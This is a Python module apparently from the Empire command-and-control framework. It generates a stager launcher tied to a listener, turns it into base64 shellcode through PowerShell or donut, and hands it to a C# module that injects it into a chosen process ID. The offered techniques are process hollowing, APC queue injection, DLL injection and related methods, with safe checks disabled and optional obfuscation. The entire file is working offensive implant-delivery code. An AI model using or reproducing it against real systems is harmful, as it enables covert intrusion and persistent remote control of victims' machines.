import base64

try:
    import donut
except ModuleNotFoundError:
    donut = None


from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleExecutionException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        pid = params["pid"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscation_command = params["ObfuscateCommand"]
        language = params["Language"]
        dot_net_version = params["DotNetVersion"].lower()
        arch = params["Architecture"]
        launcher_obfuscation = params["Obfuscate"] == "True"

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleExecutionException("Invalid listener: " + listener_name)

        if language.lower() == "powershell":
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=True,
                obfuscate=launcher_obfuscation,
                obfuscation_command=launcher_obfuscation_command,
                user_agent=user_agent,
                safe_checks="false",
                proxy=proxy,
                proxy_creds=proxy_creds,
            )

            if not launcher or launcher == "" or launcher.lower() == "failed":
                raise ModuleExecutionException("Invalid launcher")

            shellcode, err = main_menu.stagergenv2.generate_powershell_shellcode(
                launcher, arch=arch, dot_net_version=dot_net_version
            )
            base64_shellcode = base64.b64encode(shellcode).decode("UTF-8")
            if err:
                raise ModuleExecutionException(err)

        elif language.lower() == "csharp":
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name,
                language="csharp",
                user_agent=user_agent,
                safe_checks="false",
                proxy=proxy,
                proxy_creds=proxy_creds,
            )

            if arch == "x86":
                arch_type = 1
            elif arch == "x64":
                arch_type = 2
            elif arch == "both":
                arch_type = 3

            if not donut:
                raise ModuleExecutionException(
                    "module donut-shellcode not installed. It is only supported on x86."
                )

            shellcode = donut.create(file=str(launcher), arch=arch_type)
            base64_shellcode = base64.b64encode(shellcode).decode("UTF-8")

        technique_map = {
            "Vanilla Process Injection": "1",
            "DLL Injection": "2",
            "Process Hollowing": "3",
            "APC Queue Injection": "4",
            "Dynamic Invoke": "5",
        }
        technique_code = technique_map.get(params["Technique"], "1")

        params_dict = {
            "DotNetVersion": dot_net_version,
            "Technique": f"/t:{technique_code}",
            "pid": f"/pid:{pid}",
            "Format": "/f:base64",
            "Shellcode": f"/sc:{base64_shellcode}",
        }

        with SessionLocal() as db:
            obfuscation_config = main_menu.obfuscationv2.get_obfuscation_config(
                db, module.language
            )

        return main_menu.modulesv2.generate_script_csharp(
            module=module, params=params_dict, obfuscation_config=obfuscation_config
        )
